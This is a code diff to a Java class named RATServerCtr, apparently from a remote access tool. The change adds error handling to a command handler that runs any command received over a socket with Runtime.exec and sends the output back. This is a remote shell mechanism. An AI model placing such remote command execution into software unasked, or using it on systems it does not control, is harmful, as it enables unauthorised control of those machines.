@@ -90,6 +90,17 @@ public class RATServerCtr {
         return input;
     }
     
+    public void sendError(String res) {
+        try {
+//            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
+            DataOutputStream dout = new DataOutputStream(list.get(list.size()-1).getOutputStream());
+//            oos.writeObject(res);
+            dout.writeUTF(res);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    
     public void commandHandler(String command) throws IOException {
         String c = command;
         try {
@@ -112,19 +123,24 @@ public class RATServerCtr {
             //String line;
             Process proc = Runtime.getRuntime().exec(c);
             BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-            
+            BufferedReader error = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
             String line = "";
-            ArrayList<String> lines = new ArrayList<>();
-            while((line = input.readLine()) != null) {
-                lines.add(line);   
-            }
-            //System.out.println(Arrays.toString(line.split("\s+"))); 
-            DataOutputStream dout = new DataOutputStream(s.getOutputStream());
-            
-            dout.writeInt(lines.size());
-            
-            for (String lineTemp : lines){
-                dout.writeUTF(lineTemp);
+            String err = "";
+            if((err = error.readLine()) != null) {
+                sendResult("");
+            }else {
+                ArrayList<String> lines = new ArrayList<>();
+                while((line = input.readLine()) != null) {
+                    lines.add(line);   
+                }
+                //System.out.println(Arrays.toString(line.split("\s+"))); 
+                DataOutputStream dout = new DataOutputStream(s.getOutputStream());
+
+                dout.writeInt(lines.size());
+
+                for (String lineTemp : lines){
+                    dout.writeUTF(lineTemp);
+                }
             }
         } catch (Exception e) {
             e.printStackTrace();
